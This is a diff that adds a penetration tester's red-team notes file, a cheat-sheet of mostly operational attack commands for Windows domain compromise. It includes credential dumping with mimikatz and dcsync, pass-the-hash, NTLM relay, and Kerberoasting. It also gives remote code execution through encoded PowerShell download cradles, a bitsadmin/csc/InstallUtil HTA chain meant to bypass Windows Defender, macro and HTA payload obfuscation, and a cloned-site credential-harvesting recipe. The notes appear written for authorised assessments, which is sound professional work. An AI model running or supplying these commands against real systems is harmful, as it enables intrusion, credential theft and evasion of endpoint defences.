@@ -1,0 +1,927 @@
+### Commands ###
+
+-Command: mount //<ip>/share /mnt/share -o username=<username>,vers=1.0
+	-Note: mount the share
+
+-Command: mount_smbfs //<ip>/share /<directory to mount to>
+	-Note: from the Mac, mount the share
+
+-Command: serversetup.sh, option 12
+	-Note: creating share
+
+-Command: /root/tools/gnmap-parser/Gnmap-Parser.sh -p
+	-Note: this will parse all nmap files and output to "Parsed-Results"
+
+-Command: ./EyeWitness.py -f <peepingtom.txt> --headless -d <directory>
+	-Note: run setup.sh before use to setup/update EyeWitness.py
+
+-Command: ./EyeWitness.py -f <ip list> --headless --prepend-https -d <directory>
+	-Note: if we don't have a peepingtom.txt but we have a list of IPs to hit, this command will form the urls needed for EyeWitness
+
+-Command: Scoper.sh -i ./targs -e ./excludes.txt -s 5 -p
+	-Note: creates scope based off of targs and excluded IPs
+
+-Command: cme smb -u <username> -H <hash> --local-auth <target> --shares
+	-Note: cme command to check access to shares
+	-Note: feed a list of port 445 systems to cme and it'll check share access for the entire list
+	-Note: feed --fail-limit to limit the number of times it will attempt to login
+
+-Command: cme smb -u <username> -H <hash> -d <domain> <target> --pass-pol
+	-Note: retrieve password policy 
+
+-Command: cme smb <target> -u <username> -p <password> -M mimikatz
+	-Note: running mimikatz on remote systems, given the provided user has access to that remote system
+
+-Command: shell net user <username> /domain
+	-Note: check to see what groups the current user is a member of
+
+-Command: shell dir \\<computername>\c$
+	-Note: check access to the C share on the remote computer
+
+-Command: shell type <file>
+	-Note: read the contents of a file on the computer
+
+-Command: shell tasklist /s <host> /v
+	-Note: dump processes running on the remote computer
+
+-Command: tasklist /v | find "powershell.exe"
+	-Note: search for any processes running as powershell.exe
+
+-Command: shell copy <payload> \\<IP>\c$\<directory>
+	-Note: upload a payload to the remote computer
+
+-Command: wmic /node:<IP> /user:<"domain\user"> /password:<"password"> process call create "cmd /c c:\<path>\<payload>"
+	-Note: executing, via WMI, something that's been copied to a target server
+
+
+-Command: shell wmic /node:x.x.x.x process call create "cmd.exe /c mshta.exe https://test.com/06-cactus.hta"
+
+-Command: shell wmic /node:<host> process call create "powershell -encodedcommand <base64encoded>"
+
+
+-Command: shell net accounts
+	-Note: get password policy, without password complexity policy
+
+-Command: shell net group "Domain Admins" /domain
+
+-Command: net domain_trusts
+
+-Command: shell net sessions
+	-Note: once on a system, preferably a file server or something where a lot of people connect to, run to see where they're connecting from.
+	-Note: if we have credentials to the box they're connecting from and they're an interesting/privileged user, we may get access to the actual target or glean more information about the actual target by getting access to their system
+
+
+--- If we have a plaintext password...
+-Command: make_token <domain\user> <password>
+	-Note: shell net user the user before token is made and ensure account not locked out
+	-Note: shell dir another system account should have access to
+
+-Command: steal_token <PID>
+
+
+--- If we have a hash...
+-Command: pth <domain\user> <ntlm hash>
+
+-Command: rev2self
+	-Note: drop token 
+
+-Command: dcsync <long FQDN> <short FQDN\acct>
+	-Note: dcsync a given account 
+	-Note: for example, dcsync totes.a.real.domain totes\krbtgt
+
+-Command: psexec_psh <target> <listener>
+
+-Command: wmi <target> <listener>
+
+-Command: sleep 300 20
+	-Note: sleep the beacon for 300 seconds with 21% jitter
+
+-Command: drives
+
+-Command: ./start_neo4j.sh
+	-Note: start the neo4j database and BloodHound 
+
+-Command: ufw delete <rule number>
+
+-Command: ufw disable
+
+-Command: ufw status verbose
+
+-Command: ufw status numbered
+
+-Command: ufw allow 80
+
+-Command: ufw allow from any to any port 80 proto tcp
+	-Note: ports needed on mail server/teamserver
+		443
+		25
+		993
+		587
+		50050
+
+-Command: ufw allow from <0.0.0.0/8> to any port 443
+
+-Command: ufw insert 2 deny from any to any 
+	-Note: insert a deny rule to the second position in the rule stack 
+
+-Command: ufw deny from <ip>
+
+-Command: dhclient
+	-Note: renew DHCP on Kali
+
+-Command: nmap -Pn -n -sS -p 21-23,25,53,111,137,139,445,80,443,1433,2049,3389,5909,8000,8443,8080 --min-hostgroup 255 --min-rtt-timeout 0ms --max-rtt-timeout 100ms --max-retries 1 --max-scan-delay 0 --min-rate 2000 -oA <name> -vvv --open -iL <IPLIST>
+	-Note: From @killswitch-GUI and https://github.com/noahpowers
+	-Note: used at discovery stage of assessment
+
+-Command: nmap -Pn -n -sS -p- -sV --min-hostgroup 255 --min-rtt-timeout 25ms --max-rtt-timeout 100ms --max-retries 1 --max-scan-delay 0 --min-rate 1000 -oA <customer-#> -vvv --open -iL <IPLIST>
+	-Note: From @killswitch-GUI and https://github.com/noahpowers
+	-Note: based on everything discovered from initial scans, those systems are then targeted with this string
+
+-Command: nmap -sT -p445 --script=smb-vuln-ms17-010
+
+-Command: split -l 500 <file to split> <prefix>
+	-Note: split a file at 500 lines with a prefix name
+
+-Command: sort --random-sort <file to sort>
+
+-Command: browserpivot <pid> <x86|x64>
+	-Note: setup proxy for teamserverIP:port - where port is "Proxy Server Port" returned from browserpivot command
+	-Note: https://www.cobaltstrike.com/help-browser-pivoting
+
+-Command: crontab -e
+	-Note: on-site, disable the crontab on the kali box that sets the firewall at 3pm
+
+
+
+### Nessus ###
+
+Configuration: select all safe checks, stop scan, random order scanning and slow down on congestion
+
+Nessus directory on the Mac: /Library/Nessus/run/sbin/
+
+
+### Hashcat ###
+
+Brute force of 7 characters: 
+
+Rockyou.txt dictionary attack:
+
+Rockyou.txt combined with rules: 
+
+Rockyou.txt combined with rockyou-30000.rule:
+
+./hashcat -m 5600 -a 0 hashes.txt -r rules/rockyou-30000.rule -o cracked.txt rockyou.txt 
+
+hashcat -m 1700 -a 0 hashes.txt rockyou.txt -d 3 -o cracked.txt
+
+./hashcat -a 0 -m 13100 autotix.txt -r rules/rockyou-30000.rule -d 3 -o cracked.txt <wordlist>
+
+
+### Veil ###
+
+python aes module
+
+
+
+### BloodHound ###
+
+Question: when default invoking BloodHound within a subdomain, will it stay within the subdomain and not reach out into others?
+
+Pick a nice place to run from and TAKE NOTE in case you lose your beacon - definitely not speaking from experience ;)
+
+CollectionMethod(s):
+
+Group - Collect group membership information
+LocalGroup - Collect local admin information for computers
+Session - Collect session information for computers
+SessionLoop - Continuously collect session information until killed
+Trusts - Enumerate domain trust data
+ACL - Collect ACL (Access Control List) data
+Container - Collect GPO/OU Data
+ComputerOnly - Collects Local Admin and Session data
+GPOLocalGroup - Collects Local Admin information using GPO (Group Policy Objects)
+LoggedOn - Collects session information using privileged methods (needs admin!)
+ObjectProps - Collects node property information for users and computers
+Default - Collects Group Membership, Local Admin, Sessions, and Domain Trusts
+All - Collect all data
+
+-Note: from SharpHound.ps1 source - https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1
+-Note: Default is usually good for a first run but in a significant environment, maybe run with singled-out options like just Session
+
+Once BloodHound is complete, download and remove .bin and .csv file, in case you lose your access
+
+
+-Command: powerpick Invoke-BloodHound -CollectionMethod <method> -CompressData
+
+querying for any session data - cypher query: 
+
+MATCH (m:User) WITH m MATCH q=((m)<-[:HasSession]-(o:Computer)) RETURN q
+	-Note: this still needs to be verified, cypher n00b
+
+Prebuilt queries exist in "PrebuiltQueries.json" if you want to reference creator queries
+
+
+Using BloodHound and don't know the neo4j password?:
+delete the \data\dbms\auth file and then login to remote interface, authenticate with neo4j and set password
+
+Directories to output BloodHound data to. Ensure you're in this directory before you kick off BloodHound:
+c:\windows\tasks
+c:\windows\temp
+
+
+Configuring BloodHound to listen non-locally:
+Modify neo4j.conf file located in neo4j-community\conf\ folder
+In the conf file, under "Network connector configuration", uncomment "dbms.connectors.default_listen_address=0.0.0.0"
+After this, start neo4j and anyone should be able to connect to your BloodHound instance at this point
+
+
+### UserHunter ###
+
+-Command: powerpick Invoke-UserHunter -GroupName "superprivilegedgroup" -UserFile userfile.txt
+
+
+### PowerView ###
+
+Parameters:
+ComputerName
+ComputerFile
+ComputerFilter
+ComputerADSpath
+ExcludeStandard
+ExcludePrint
+ExcludeIPC
+CheckShareAccess
+CheckAdmin
+NoPing
+Delay
+Jitter
+Domain
+DomainController
+SearchForest
+Threads
+        
+PS C:\> Invoke-ShareFinder -ComputerFile hosts.txt
+
+
+https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
+
+
+
+### Modifying a Malleable C2 Profile ###
+
+randomize data - for example, amazon.profile
+then, run c2lint
+
+add to profile and specify custom names for the attributes below:
+set pipename "atsvc_09";
+set pipename_stager "browser_09";       //to top of profile to change defaults
+
+used list of well-known pipes to name the above pipes - currently testing with the numbers above
+
+Kill date: YYYY-MM-DD
+
+
+
+### Burp ###
+
+Extender -> Options -> Tools -> Burp -> jython and jruby envs
+1. Active Scan
+2. Vulners - Software vulnerability scanner
+	-Note: passive scan/discover content
+3. WSDLER
+
+Give Burp 2G of ram: -Xmx2g
+
+Regex scope: 
+
+
+### Subdomain enumeration ###
+https://github.com/aboul3la/Sublist3r
+
+
+
+### Mimikatz ###
+
+Crypto - https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto
+
+-Command: mimikatz crypto::stores /systemstore:current_user
+
+-Command: mimikatz lsadump::secrets
+
+
+### Egress-Assess ###
+
+Attempt with all protocols
+Need to setup server to receive data and on a box we've compromised, powershell-import the .ps1 and issue commands to attempt to connect back out
+
+
+
+### Backing up data ###
+
+1. Reporting -> Export all CS reports
+2. Reporting -> Export Data -> All TSV and XML
+3. Zip cobaltstrike directory
+    -Command: zip -r <.zip file> <directory_to_zip>
+4. Push everyone's home directory/files up to the share
+5. Zip entire share
+
+
+
+### Morph-HTA ###
+
+./morph-hta --in <CShta> --out <outfile> --maxstrlen 10 --maxvarlen 6
+pay attention to size
+pay attention to "null"
+it may take a couple of iterations to generate a working hta
+issues with python stripping errors - specify --mode mshta
+	-Note: even though morph says to specify as upper case, use lower case 
+recently, maxstrlen 8 and maxvarlen 12
+
+### Ruler - Outlook Rules Exploitation ###
+
+go run ruler.go --username <username> --password <pass> --domain <domain> --email <email address>
+
+
+
+### Payload fun ###
+
+1. SharpShooter
+2. Demiguise
+3. CactusTorch
+4. DotNet to JScript
+5. Morph-HTA
+6. Spookflare
+7. Ebowla
+8. Unicorn
+9. Tikitorch
+
+
+
+
+### Payload testing with customer ###
+
+After generating and hosting payloads, compile URLs to give to them and walk them through execution
+Probably best to not read off the URLs to them and have them type it in ;)
+Best to compile a file of all URLs and then attach that file to a Cobalt Strike Spearphish campaign to the PoC
+
+
+
+### Payload Naming ###
+
+Examples: 
+01-dns-hta-exec.hta
+03-dns-hta-powershell.hta
+04-dns-hta-powershell-m.hta
+05-dns-hta-vba.hta
+06-dns-exe.exe
+07-https-hta-exec.hta
+08-https-hta-powershell.hta
+09-https-hta-powershell-m.hta
+10-https-hta-vba.hta
+11-https-exe.exe
+12-dns-spookflare-hta.html
+13-https-spookflare-hta.html
+14-dns-bat.bat
+15-dns-bat.zip //encrypted zip
+16-https-bat.bat
+17-https-bat.zip //encrypted zip
+18-macroDNStest.xlsm
+19-macroHTTPStest.xlsm
+
+
+
+//also sharpshooter
+//also cactustorch
+//maybe unicorn
+//demiguise 
+//LethalHTA
+
+### SharpShooter ###
+python Sharpshooter.py --stageless --dotnetver 2 --payload hta --output 05-ss --rawscfile stageless.bin --smuggle --template sharepoint 
+
+
+
+### Ebowla ###
+
+Given executable generated from CS, run following:
+
+-Command: ./build_x86_go.sh output/go_symmetric_<payloadname>.go test.exe
+
+Configure genetic.config for payload keying and once done, run:
+
+-Command: python ebowla.py <exe output from above> genetic.config
+
+
+### SpookFlare ###
+
+Pick module to use, for example, "javascript/hta"
+
+Export Cobalt Strike PowerShell command and store it in a file to be fed as CMD option within SpookFlare
+
+
+### Unicorn ###
+https://github.com/trustedsec/unicorn
+
+
+
+
+
+### PowerUpSQL Hotness ###
+
+Depending if the SQL instance uses SQL auth or Windows, the PowerUpSQL command parameters may be a little different
+
+If the instance is configured for SQL auth, specify the account username/password on the command line
+
+If the instance is configured for Windows auth, make_token with the account and just specify the instance name
+
+For example, if you find a web.config file w/ data source value of "SystemName\DB", this is the instance name needed for the PowerUpSQL command
+
+In this example, the instance was configured for Windows auth so make_token was used
+
+Then, issue PowerUpSQL command:
+
+-Command: powershell Get-SQLConnectionTest -Instance SystemName\DB
+    -Note: this returns whether or not it is accessible with creds we're using
+
+If accessible:
+
+-Command: powershell Invoke-SQLAudit -Instance SystemName\DB
+	-Note: returns results of different checks for vulnerable database configs
+	-Note: look for "IsVulnerable" and "IsExploitable" to be set
+
+
+
+### HP iLO 4 vulnerable firmware ###
+
+curl -k -i https://url/rest/v1/AccountService/Accounts  //should come back with unauthorized
+
+curl -k -i -H "Connection: AAAAAAAAAAAAAAAAAAAAAAAAAAAAA" https://url/rest/v1/AccountService/Accounts  //if exploitable, this should result in 200 OK
+
+Any way to derive the password generated on setup? Service tag or something that we could potentially pull by querying the rest api? By querying /rest/v1/Systems/1, we can get the SerialNumber, UUID
+
+
+
+
+Writing the attack path
+
+The attack path is written in a file named AttackPath.txt. This exists in /mnt/share/Findings/Technical Overview/. The attack path describes the external and internal path taken to gain access to the network. Screenshots are included for each step taken. To reference and include a screenshot within the attack path, name a screenshot to the step it corresponds with in the attack path. Then, the rest of the filename is the caption for the screenshot.
+
+Example: 01-Nessus Identifying X System as Vulnerable.
+
+
+
+### Getting GO Up and Running ###
+
+go is installed but to compile projects, the gopath and gobin variables need to be set
+
+given a directory, such as: /home/<client>/gobuster/, set gopath to: export GOPATH=/home/<client>/gobuster/
+
+then, create a /bin/ directory within /gobuster/ so, directory structure is /home/<client>/gobuster/bin/
+
+next, the gobin variable needs to be set to: export GOBIN=/home/<client>/gobuster/bin/
+
+at this point, GO is setup
+
+with GO setup, install gobuster:
+
+cd into gobuster directory
+
+go get && go build
+go install
+
+
+
+### Responder and SMBRelay ###
+
+Capture hashes with Responder
+Use SMBRelay to relay those hashes to a target system and kick off a command of our choosing
+runfinger.py to determine systems with no smb signing
+
+cme smb <targetcidr> --gen-relay-list cme_relay_list.txt
+
+Responder
+
+python Responder.py -I eth0 -wrP 
+
+Ntlmrelayx
+
+python /usr/local/bin/ntlmrelayx.py -tf cme_relay_list.txt -c 'command to execute once relayed'
+
+OR 
+
+MultiRelay
+
+python MultiRelay.py -t <IP> -u ALL -c 'command to execute once relayed'
+
+
+
+### PowerShell Empire ###
+
+./empire
+
+1. Setup a listener
+	-> listeners 
+	-> list 
+    -> uselistener http
+    -> info
+    	-Note: to look at options of http listener
+    -> execute
+    	-Note: starts listener
+
+2. Launch
+	-> launcher powershell http
+		-Note: returns powershell command to execute on target system
+
+3. Agents
+	-> 
+
+
+### Modified HTA w/ bitsadmin download and compiling on target box ###
+
+1. Cobalt Strike -> Payload Generator -> C# (x86) - x64 killed InstallUtil on multiple occasions
+2. script.cs -> replace buf with buf from the Cobalt Strike payload generator
+3. At this point, the script.cs is ready to be hosted -> rename, if needed, and Attacks -> Host File
+4. Generate Cobalt Strike HTA -> Attacks -> Packages -> HTML Application (just to be used as a template for our attack)
+5. Modify HTA
+	-Task: remove Cobalt Strike powershell var_shell.run command
+	-Task: add, under the CreateObject("Wscript.Shell"):
+		var_shell.run "cmd.exe /c bitsadmin /transfer <transfername> https://site/Update.cs %TEMP%\Update.cs", 0, true
+		var_shell.run "cmd.exe /c c:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:%TEMP%\Update.exe %TEMP%\Update.cs", 0, true
+		var_shell.run "cmd.exe /c c:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U %TEMP%\Update.exe", 0, true
+6. Host HTA
+
+-Note: pay attention to .NET Framework version, might need to use v2.x.x, it could be on Windows 10 but maybe not 
+-Note: test each of the commands above singularly from a test box to ensure bitsadmin is working, csc.exe is compiling and InstallUtil is executing
+-Note: way to bypass Windows Defender 
+-Note: on latest assessment, .exe was getting caught by BitDefender
+	-Note: need to find a way to obfuscate
+
+
+
+References: https://raw.githubusercontent.com/khr0x40sh/WhiteListEvasion/master/InstallUtil/script.cs
+            https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/
+
+
+
+
+ToDo: add logic to work on win10 and win7
+	  encode each byte in payload
+
+
+
+### dotdotpwn ###
+
+On the image, dotdotpwn.pl is located in /usr/share/dotdotpwn/
+
+Create the Reports directory: mkdir /usr/share/dotdotpwn/Reports
+
+Now, when running, all reports will be output to that directory
+
+-Command: dotdotpwn -m http-url -u http://10.x.x.x:7002/TRAVERSAL -d 8 -f \\windows\\win.ini -o windows -k "[fonts]" -b -r testing.txt
+
+
+### AD Explorer - Sysinternals ###
+
+On Windows testing machine, Sysinternals suite is located on desktop
+
+If we have a DA with plaintext and a DC we want to query, we can use this to view AD
+
+
+
+
+
+### DNS Listeners ###
+
+In Cobalt Strike, listener of windows/beacon_dns/reverse_dns_txt
+
+Given a domain of test.gov that will be your DNS host, configure:
+
+1. A record of host: @, value: IP of server
+2. A record of host: dns, value: IP of server
+3. NS record of ns1, value: dns.test.gov
+
+-Note: all TTLs of 5 min
+
+4. Listener of windows/beacon_dns/reverse_dns_txt, host: dns.test.gov, beacons: ns1.test.gov
+
+
+quad a-records
+
+
+
+### Email Testing ###
+At the start of the assessment, ensure domains aren't categorized as phishing....
+Send base email first, with no links
+Send follow-on with links to see if email reaches inbox
+
+
+
+### Encoding Cobalt Strike PowerShell Download Cradle (scripted web delivery) ###
+
+Using cme smb, verified user/hash worked on target system 
+Multirelay authenticated to target system but had troubles executing commands
+Instead, started testing command execution via cme smb -x (cmd.exe) and -X (powershell.exe)
+Started with a ping back to myself and tcpdump on kali system resulted in successful cmd execution
+To get beacon, attempted PowerShell download cradle: 
+	powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://cobaltstrikeIP/psh'))"
+		-Note: the above command taken directly from CS -> Attacks -> Web Drive-by -> Scripted Web Delivery -> Copy URL
+
+However, cme smb -X doesn't like this PowerShell command
+To get around this, I PowerShell base64 encoded the download portion of the command, everything in the ""
+
+$command = "IEX ((new-object net.webclient).downloadstring('http://cobaltstrikeIP/psh'))"
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+$encoded = [Convert]::ToBase64String($bytes)
+
+At this point, our PowerShell download command is encoded
+
+Testing the encoded string to ensure it decodes as expected:
+
+$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("encoded string"))
+$decoded #should return our download string, as expected
+
+So, trying to execute our PowerShell command with cme smb again:
+cme smb -u user -H hash --local-auth --fail-limit 1 10.x.x.x -X "powershell -encodedcommand base64encodedstring"
+
+This worked to get a beacon on the user's box
+
+
+
+
+### Medium Mandatory Level ###
+whoami /groups
+can still make_token, assuming a plaintext password has been found in a different way
+once the token is made, you won't be able to use windows commands but can use native Cobalt Strike commands
+	-Note: ls \\target\c$ - to ensure access to target system
+
+
+
+### AS/400 ###
+
+milo2012 github - contains 7 different default credentials
+Was able to use Cobalt Strike proxypivot, proxychains and telnet to connect to target machine on telnet port 23
+
+
+
+### PowerView.ps1 ### 
+
+Find-InterestingFile -Path "\\system\path\" -Terms password,as400,credentials -LastAccessTime (Get-Date).AddDays(-7)
+
+
+### Interfacing with AD ###
+
+Trying to stay off the DC, using Find-InterestingFile to find any sysinternalssuite stashed out on the share
+If there is something out there, we can RDP into a box and use those tools out on the share
+ 
+
+
+### Inveigh ###
+
+Remote responder PowerShell script
+
+
+
+### Grepping for a string in some files in a directory ###
+
+Command: grep -rnw '/path/to/files/' -e 'patterntosearch'
+
+
+### Metasploit Exploit Rankings ###
+
+https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking
+
+
+
+### Screen ###
+
+Command: screen -dmS team ./teamserver IP password profile 2018-12-29
+
+Shortcut: ctrl+a+d
+
+
+### sshuttle ###
+sshuttle -l 127.0.0.1:4322 -r root@sshbox targetrange/8 -x localsystemip
+
+sshuttle -l 127.0.0.1:4322 -r root@sshbox targetrange/8 -x localsystemip --ssh-cmd 'ssh -i /etc/ssh/ssh_host_rsa_key'
+
+
+
+
+### Malleable-C2-Randomizer ###
+
+python malleable-c2-randomizer.py -profile ocsp.profile -output ocsp-r.profile -cobalt <cobaltstrike directory>
+
+
+
+
+### Cobalt Strike Template Embedded Link ###
+
+<a href="%URL%">CDC Infectious Diseases Contact Form</a>
+
+Put this in the html portion of the template
+
+
+
+### Kerberoast ###
+
+1. autokerberoast.ps1
+	-Note: Invoke-AutoKerberoast
+	-Note: Invoke-AutoKerberoast -GroupName "Domain Admins"
+
+
+
+### Winscp and stored passwords ###
+
+once on a box, discovered ssh connection 
+
+used following command to determine what was using/creating that connection:
+
+	-Command: netstat -ano | find "ssh"
+		-Note: this will return the pid 
+
+	-Command: tasklist | find "<returned pid from previous command>"
+		-Note: returns executable associated with that pid  
+		-Note: returned that Winscp was creating the ssh connection 
+
+
+knowing that winscp was creating the connection, guessed that there were creds stored somewhere
+
+researching here: https://winscp.net/eng/docs/config#ini, discovered the portable version of winscp uses the WinSCP.ini file to store configurations including passwords
+
+on the system where the ssh connection was being made, used PowerView's Find-InterestingFile on the system searching from c:\ to find the WinSCP.ini file
+
+downloaded the portable version of winscp and used the winscp.ini file to authenticate to some of the systems with SshHostKeys in the WinSCP.ini file
+
+to export the password, with a host name configured to ssh to, click on Manage -> Generate Session URL/Code -> .NET assemble code 
+	-Note: password will now be in the code portion of WinSCP 
+
+
+
+### PowerShell Registry Interaction ###
+
+-Command: Get-Item -Path Registry::"hkcu\software\martin prikryl\winscp 2\"
+
+
+
+### Configuring Thunderbird ###
+
+Your name: whatever name you want
+Email address: user@domain.com 
+Password: password for above user 
+
+Incoming: IMAP - Server hostname: domain.com - Port: 993 - SSL: SSL/TLS - Auth: Normal Password
+Outgoing: SMTP - Server hostname: domain.com - Port: 587 - STARTTLS     - Auth Normal password 
+Username: incoming: user - outgoing: user 
+
+
+
+### Manual Credstealer ###
+1. Use httrack to clone site with login functionality
+2. identify page where login functionality exists
+3. modify post action to post to custom php file in root of web
+4. host the php file that receives user/pass and outputs to file
+
+
+
+
+### Deserialization ###
+Oracle WebLogic t3 Exploitation
+
+https://www.exploit-db.com/exploits/44553
+Metasploit -> exploit/multi/misc/weblogic_deserialize_rawobject
+Metasploit -> exploit/multi/misc/weblogic_deserialize_marshalledobject
+
+
+
+### Tcpdump ###
+ip.addr == x.x.x.x
+tcp contains "calc.exe"
+http.request.method == "POST" 
+
+
+### Html page for sandbox evasion ###
+https://github.com/Matrix20085/smallTools
+
+
+### Add time stamp to bash history ###
+$ HISTTIMEFORMAT = "%d/$m/%y %T "
+$ echo 'export HISTTIMEFORMAT = "%d/$m/%y %T "' >> ~/.bash_profile
+$ source ~/.bash_profile
+
+then run the history command again
+
+
+### Sqlmap ###
+
+Command: sqlmap -r <file containing post request> -p "txtField1" --dbms oracle --os windows --level 1 --banner 
+
+	-Other options:
+		1. --current-user
+		2. --dbs
+		3. --technique E
+		4. -D <database>
+		5. -T <table>
+		6. --dbs 
+		7. --tables
+		8. --count 
+		9. --dump 
+		10. --output-dir=/home/dir/
+		11. --privileges -U <current-user>
+		12. 
+
+	-Process:
+		a. sqlmap --dbs 
+		b. sqlmap -D <database> --tables 
+		c. sqlmap -D <database> -T <table>
+		d. sqlmap -D <database> -T <table> --count 
+		e. sqlmap -D <database> -T <table> --columns
+		f. sqlmap -D <database> -T <table> --dump 
+
+		-Reference: https://github.com/sqlmapproject/sqlmap/wiki/Usage
+
+	-Question: can get code execution with Oracle 11gr2?
+		-Reference: https://media.blackhat.com/bh-us-10/whitepapers/Siddharth/BlackHat-USA-2010-Siddharth-Hacking-Oracle-from-the-Web-wp.pdf
+
+
+
+### Report Generator Issues ###
+pip install python-pptx
+pip install --user -U nltk
+python -m pip install --user --upgrade pip===9.0.3
+
+
+### Site Categorization URL/IP Lookup ###
+https://www.brightcloud.com/tools/url-ip-lookup.php
+BlueCoat
+
+
+### Demiguise ###
+
+python demiguise.py -k Imapassword -c "mshta.exe https://site.com/hta.hta" -o demi.hta -p WbemScripting.SWbemLocator
+
+### Evilclippy ###
+
+download exe, create doc/excel with macro, use EvilClippy to apply modifications to macrodoc
+
+note: stomping not working?
+
+compiling on latest Kali assessment machines works well
+
+mono EvilClippy.exe -h 
+
+mono EvilClippy.exe -g <macro-enabled doc>
+	-Note: hide code from VBA editor GUI 
+
+mono EvilClippy.exe -r <macro-enabled doc>
+	-Note: set random modules names
+
+
+
+
+### Runas /netonly ###
+
+runas.exe /netonly /user:<domain>\user cmd.exe 
+
+
+
+### TikiTorch ###
+
+1. in my Google Drive 
+
+
+
+### SharpWMI ###
+
+execute-assembly SharpWMI.exe action=create computername=x.x.x.x command=mshta.exe http://test.hta 
+
+
+### SharpHound.exe ###
+
+SharpHound.exe -d <fqdn> -ZipFileName <name>.zip 
+
+
+### impacket ###
+
+remove everything in /usr/bin/dist-something/impacket 
+git clone impacket 
+cd impacket 
+pip install .
+python setup.py install 
+
+
+### Differences between two files ###
+
+-Command: grep -Fxf <file1> <file2>
+
+
+### MongoDB GUI ###
+
+https://robomongo.org/download
+
+./robo3t
+
+
+
+### PTP Setup ###
+copy kali OVA from case drive -> import to Fusion 
+copy over ptp to kali OVA 
